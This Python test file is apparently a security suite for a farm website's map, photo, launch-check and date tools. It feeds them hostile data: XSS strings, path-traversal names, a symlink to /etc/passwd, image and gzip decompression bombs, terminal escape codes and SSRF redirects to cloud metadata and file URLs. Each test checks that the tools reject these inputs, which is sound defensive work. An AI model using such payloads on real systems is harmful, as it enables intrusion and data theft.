            {'type': 'pin', 'id': '"><img src=x onerror=alert(1)>', 'kind': 'x"><b>', 'label': '</script><img src=x onerror=alert(1)>', 'note': 'javascript:alert(1)     </script>', 'pts': [[10, 10]]},
            {'type': 'pin', 'id': '__proto__', 'kind': 'barn', 'label': '__proto__', 'pts': [[1e308, -1e308]]},
            {'type': 'area', 'id': 'a', 'kind': 'barn', 'label': 'x' * 5000, 'note': 'y' * 5000, 'pts': [[0, 0], [10, 0], ['nan', 3], [10, 10], [5, 'x']]}]}
        code, out = self.map(site, doc)
        self.assertEqual(code, 0, out)
        js = open(os.path.join(site, 'js', 'farm-map-data.js'), encoding='utf-8').read()
        self.assertNotIn('</script', js.lower())
        self.assertNotIn(' ', js)
        self.assertNotIn(' ', js)
        data = json.loads(js[js.index('{', js.index('WISE_ACRES_MAP')):js.rindex('}') + 1].replace('<\\/', '</'))
        self.assertEqual(data['north'], 'up')
        for it in data['items']:
            self.assertRegex(it['id'], r'^[A-Za-z0-9_-]+$')
            self.assertLessEqual(len(it['label']), 80)
            self.assertLessEqual(len(it.get('note', '')), 400)
            self.assertTrue(all(0 <= x <= 1000 and 0 <= y <= 800 for x, y in it['pts']))

    def test_a_file_that_is_not_a_saved_map_gives_a_plain_message_and_changes_nothing(self):
        site = fresh_site(self)
        before = open(os.path.join(site, 'js', 'farm-map-data.js'), 'rb').read()
        for name, kw in (('400 pins', {'doc': {'imageSize': {'width': 100, 'height': 100}, 'items': [{'type': 'pin', 'kind': 'barn', 'label': 'p', 'pts': [[1, 1]]}] * 400}}),
                         ('nested 200000 deep', {'raw': '[' * 200000}), ('a string', {'raw': '"hello"'}), ('not JSON', {'raw': 'hello'})):
            code, out = self.map(site, **kw)
            self.assertEqual(code, 1, name)
            self.assertNotIn('Traceback', out, name)
        big = os.path.join(os.path.dirname(site), 'big.json')
        with open(big, 'w', encoding='utf-8') as f:
            f.write('{"items": [], "pad": "' + 'x' * (21 * 1024 * 1024) + '"}')
        code, out = run_tool(site, ['tools/farm_map.py', big])
        self.assertEqual(code, 1)
        self.assertIn('MB', out)
        code, out = run_tool(site, ['tools/farm_map.py', '/dev/null'])
        self.assertEqual(code, 1)
        self.assertNotIn('Traceback', out)
        self.assertEqual(open(os.path.join(site, 'js', 'farm-map-data.js'), 'rb').read(), before)


# ============================================================================================ tools/add_photo.py
@unittest.skipUnless(have('PIL'), 'needs Pillow (pip install pillow)')
class PhotoSafety(unittest.TestCase):
    ALT = 'A red field with a small barn in the distance'

    @classmethod
    def setUpClass(cls):
        cls.site = os.path.join(TEMPLATE, 'site')
        cls.ap = load(cls.site, 'add_photo')
        cls.dir = tempfile.mkdtemp(prefix='wa-safety-photo-')

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.dir, ignore_errors=True)

    def picture(self, name, size=(800, 600)):
        from PIL import Image
        p = os.path.join(self.dir, name)
        Image.new('RGB', size, (200, 30, 30)).save(p, 'JPEG')
        return p

    def refused(self, call, *args):
        with self.assertRaises(SystemExit) as c:
            call(*args)
        return str(c.exception.code)

    def test_pictures_that_are_not_pictures_are_refused_with_a_plain_message(self):
        from PIL import Image
        good = self.picture('good.jpg')
        im, fmt, size = self.ap.open_picture(good)
        self.assertEqual(fmt, 'JPEG')
        bomb = os.path.join(self.dir, 'bomb.png')
        Image.new('1', (20000, 20000)).save(bomb)   # a few KB on disk, 400 million pixels once opened
        self.assertLess(os.path.getsize(bomb), 200000)
        text = os.path.join(self.dir, 'notes.jpg')
        open(text, 'w', encoding='utf-8').write('hello ' * 400)
        eps = os.path.join(self.dir, 'a.jpg')
        open(eps, 'w', encoding='utf-8').write('%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 500 500\n' + 'x' * 2000)
        raw = open(good, 'rb').read()
        cut = os.path.join(self.dir, 'cut.jpg')
        open(cut, 'wb').write(raw[:len(raw) // 2])
        link = os.path.join(self.dir, 'link.jpg')
        os.symlink('/etc/passwd', link)
        huge = os.path.join(self.dir, 'huge.jpg')
        with open(huge, 'wb') as f:
            f.write(raw)
            f.truncate(self.ap.MAX_FILE_MB * 1024 * 1024 + 10)
        for name, p in (('a picture of 400 megapixels', bomb), ('a text file', text), ('an EPS file (Ghostscript)', eps), ('a link to /etc/passwd', link), ('a folder', self.dir),
                        ('a missing file', os.path.join(self.dir, 'nothing.jpg')), ('a file over the size limit', huge)):
            msg = self.refused(self.ap.open_picture, p)
            self.assertTrue(msg.startswith('Problem:'), name + ': ' + msg)
            self.assertNotIn('root:', msg, name)
        cutim, _, _ = self.ap.open_picture(cut)   # opening reads only the header: the damage shows when it is read in full, and is reported then
        with self.assertRaises(Exception):
            self.ap.upright_and_clean(cutim)

    def test_words_typed_with_a_picture_cannot_carry_code_or_terminal_codes(self):
        for alt in ('A barn </script><script>alert(1)</script> in a field', 'A barn \\" + alert(1) + \\" in a field', 'A barn <img src=x onerror=alert(1)> in the field'):
            self.assertTrue(self.refused(self.ap.clean_text, alt, 'alt text', 300, 10).startswith('Problem:'), alt)
        text, notes = self.ap.clean_text('A barn \x1b[2J\x1b]0;pwned\x07 in\x0cthe field\u202e\u2028and \x7f more', 'alt text', 300, 10)
        self.assertFalse(re.search('[\x00-\x1f\x7f-\x9f\u202e\u2028]', text), repr(text))
        self.assertIn('in the field', text)
        pic = self.picture('words.jpg')
        code, out = run_tool(self.site, ['tools/add_photo.py', pic, '--name', 'safety-test', '--alt', 'A barn \x1b[2J\x1b]0;pwned\x07 in the field\u202e', '--caption', 'Hi\u2028there', '--dry-run'])
        self.assertEqual(code, 0, out[-300:])
        self.assertFalse(re.search('[\x00-\x08\x0b-\x1f\x7f-\x9f\u202e]', out), repr(out[:300]))
        self.assertIn('Dry run: nothing was changed', out)

    def test_the_name_becomes_a_plain_file_name_in_assets_photos(self):
        for name in ('../../evil', '/etc/cron.d/x', '.htaccess', 'CON', 'a\u202eb', 'x' * 400, 'goat in frog hat', 'Ni\u00f1o jugando'):
            got = self.ap.slug(name)
            self.assertRegex(got, r'^[a-z0-9]+(-[a-z0-9]+)*$', name)
            self.assertLessEqual(len(got), 60)
        self.assertEqual(self.ap.slug('goat in frog hat'), 'goat-in-frog-hat')
        for bad in ('...', '', '\u202e', '12345', '../..'):
            self.refused(self.ap.slug, bad)


# ============================================================================================ tools/launch_check.py
class LaunchCheckSafety(unittest.TestCase):
    """A web server that misbehaves, on this computer (no internet)."""

    @classmethod
    def setUpClass(cls):
        cls.lc = load(os.path.join(TEMPLATE, 'site'), 'launch_check')
        zeros = gzip.compress(b'\0' * (40 * 1024 * 1024), 9)   # about 40 KB that unpack to 40 MB

        class H(http.server.BaseHTTPRequestHandler):
            protocol_version = 'HTTP/1.0'

            def log_message(self, *a):
                pass

            def do_GET(self):
                p = self.path
                if p == '/ok':
                    body = b'<html>ok</html>'
                    self.send_response(200); self.send_header('Content-Type', 'text/html'); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body)
                elif p.startswith('/redir/'):
                    self.send_response(302); self.send_header('Location', p[len('/redir/'):].replace('~', '/')); self.end_headers()
                elif p == '/gzip-bomb':
                    self.send_response(200); self.send_header('Content-Encoding', 'gzip'); self.send_header('Content-Length', str(len(zeros))); self.end_headers(); self.wfile.write(zeros)
                elif p == '/big':
                    self.send_response(200); self.end_headers()
                    try:
                        for _ in range(60):
                            self.wfile.write(b'x' * 65536)
                    except OSError:
                        pass
                elif p == '/drip':
                    self.send_response(200); self.end_headers()
                    try:
                        for _ in range(100):
                            self.wfile.write(b'x'); self.wfile.flush(); time.sleep(0.1)
                    except OSError:
                        pass
                else:
                    self.send_response(404); self.end_headers()

        cls.srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), H)
        cls.srv.daemon_threads = True
        cls.base = 'http://127.0.0.1:%d' % cls.srv.server_address[1]
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()

    def test_only_web_addresses_are_followed(self):
        f = self.lc.Fetcher(timeout=5)
        for target in ('file:~~~etc~passwd', 'ftp:~~evil.example~x', 'gopher:~~127.0.0.1~x', 'javascript:alert(1)', 'data:text/html,x'):
            with self.assertRaises(self.lc.FetchError, msg=target) as c:
                f.follow(self.base + '/redir/' + target)
            self.assertIn('not a web address', c.exception.message)
        with self.assertRaises(self.lc.FetchError):
            f.request('file:///etc/passwd')

    def test_a_redirect_with_a_password_in_it_is_not_followed(self):
        f = self.lc.Fetcher(timeout=5)
        with self.assertRaises(self.lc.FetchError):
            f.follow(self.base + '/redir/http:~~user:pw@127.0.0.1:1~x')

    def test_a_site_on_the_internet_cannot_send_the_check_into_a_private_network(self):
        lc = self.lc
        real = lc.private_address
        lc.private_address = lambda host: host != 'public.example'
        try:
            f = lc.Fetcher(timeout=5)
            def fake(url, **kw):
                r = lc.Resp(url); r.status = 302; r.headers = {'location': 'http://169.254.169.254/latest/meta-data/'}; return r
            f.request = fake
            with self.assertRaises(lc.FetchError) as c:
                f.follow('http://public.example/')
            self.assertIn('private network', c.exception.message)
            f2 = lc.Fetcher(timeout=5)   # a practice run on this computer may redirect inside it
            seen = []
            def fake2(url, **kw):
                seen.append(url); r = lc.Resp(url); r.status = 302 if len(seen) == 1 else 200; r.headers = {'location': 'http://127.0.0.1:9/x'} if len(seen) == 1 else {}; return r
            f2.request = fake2
            final, chain = f2.follow('http://127.0.0.1:8/')
            self.assertEqual(len(chain), 2)
        finally:
            lc.private_address = real
        for host in ('127.0.0.1', '10.1.2.3', '169.254.169.254', '192.168.0.1', '::1', '[::1]', '0.0.0.0', 'fe80::1', '100.64.0.1'):
            self.assertTrue(real(host), host)
        for host in ('8.8.8.8', '1.1.1.1', '2606:4700::1111'):
            self.assertFalse(real(host), host)

    def test_an_answer_that_unpacks_to_gigabytes_is_cut_at_the_limit(self):
        f = self.lc.Fetcher(timeout=10)
        r = f.request(self.base + '/gzip-bomb', maxbytes=1000000)
        self.assertLessEqual(len(r.body), 1000000)
        self.assertTrue(r.truncated)
        r = f.request(self.base + '/big', maxbytes=1000000)
        self.assertLessEqual(len(r.body), 1000001)
        ok = f.request(self.base + '/ok')
        self.assertEqual((ok.status, ok.body, ok.truncated), (200, b'<html>ok</html>', False))

    def test_an_answer_that_never_finishes_ends_by_itself(self):
        f = self.lc.Fetcher(timeout=5)
        f.deadline = 1.0
        t0 = time.time()
        with self.assertRaises(self.lc.FetchError) as c:
            f.request(self.base + '/drip')
        self.assertEqual(c.exception.kind, 'timeout')
        self.assertLess(time.time() - t0, 5)

    def test_a_password_in_the_address_is_never_printed(self):
        # the check strips "name:password@" from what it prints and still runs (nothing listens on port 1: it fails at once, with its own message)
        code, out = run_tool(os.path.join(TEMPLATE, 'site'), ['tools/launch_check.py', 'http://owner:Sup3rSecret@127.0.0.1:1/'])
        self.assertNotIn('Sup3rSecret', out)
        self.assertNotIn('owner:', out)
        code, out = run_tool(os.path.join(TEMPLATE, 'site'), ['tools/launch_check.py', '--json', 'https://owner:Sup3rSecret@'])
        self.assertNotIn('Sup3rSecret', out)
        for bad in ('file:///etc/passwd', 'javascript:alert(1)', 'https://', 'https://exa mple.com', 'ftp://x.example/'):
            self.assertIsNone(self.lc.normalize_address(bad), bad)


# ============================================================================================ tools/date_phrases.py
class DatePhrasesSafety(unittest.TestCase):
    def test_random_hostile_text_gives_nothing_or_the_two_fixed_marks(self):
        dp = load(os.path.join(TEMPLATE, 'site'), 'date_phrases')
        rnd = random.Random(1)
        alphabet = string.ascii_letters + string.digits + ' &;<>/"\'–-.:,\n\t’‮\x1b'
        pieces = ['Oct 9', 'Oct 9–11', '<strong>Open now:</strong> pizza reservations for ', ' We haven’t opened Sunday, Oct 4. Unless the forecast changes a lot, we’ll be closed that day for rain.', 'Oct', '&amp;', 'Nov', '</strong>']
        for _ in range(8000):
            s = ''.join(rnd.choice(pieces) if rnd.random() < 0.35 else rnd.choice(alphabet) for _ in range(rnd.randint(0, 12)))
            for code in dp.LANGS:
                out = dp.translate(code, s)
                if out is not None:
                    self.assertTrue(all(t in ('<strong>', '</strong>') for t in re.findall(r'<[^<>]*>', out)), repr((s, out)))
        for s in ('a' * 1000000, 'Oct ' + '9' * 100000, '<strong>Open now:</strong> pizza reservations for ' + 'Oct 9 &amp; ' * 50000, '. ' * 200000):
            t0 = time.time()
            self.assertIsNone(dp.translate('es', s))
            self.assertLess(time.time() - t0, 2)


if __name__ == '__main__':
    unittest.main(verbosity=2 if '-v' in sys.argv else 1, argv=[a for a in sys.argv if a != '-v'], warnings='ignore')
